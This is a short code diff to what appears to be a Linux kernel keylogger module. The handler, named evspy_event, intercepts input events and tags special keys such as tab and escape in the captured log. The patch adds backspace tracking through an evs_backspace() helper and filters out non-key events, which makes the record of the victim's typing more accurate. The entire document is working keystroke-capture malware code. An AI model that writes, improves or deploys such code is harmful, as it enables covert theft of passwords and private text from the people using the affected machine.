@@ -128,6 +128,9 @@ static void special_char(unsigned int code, unsigned int value)
 	case KEY_TAB:
 		sp_tag = "[TAB]";
 		break;
+	case KEY_BACKSPACE:
+		sp_tag = "[<<]";
+		break;
 	case KEY_ESC:
 		sp_tag = "[ESC]";
 		break;
@@ -164,15 +167,18 @@ static void special_char(unsigned int code, unsigned int value)
 static void evspy_event(struct input_handle *handle, unsigned int type,
 		unsigned int code, int value)
 {
-	// Ignore hold-key events
-	if (unlikely(value == EVS_VAL_HOLD))
+	// Ignore non-key and hold events
+	if (type != EV_KEY || unlikely(value == EVS_VAL_HOLD)) {
 		return;
 
 	// If caps lock is pressed, handle it the same way as left shift
-	if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
+	} else if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
 		special_char(KEY_LEFTSHIFT, capslock_state);
 		return;
-	} else if (type != EV_KEY) {
+
+	// Backspace
+	} else if (code == KEY_BACKSPACE && value == EVS_VAL_PRESS) {
+		evs_backspace();
 		return;
 	}
 
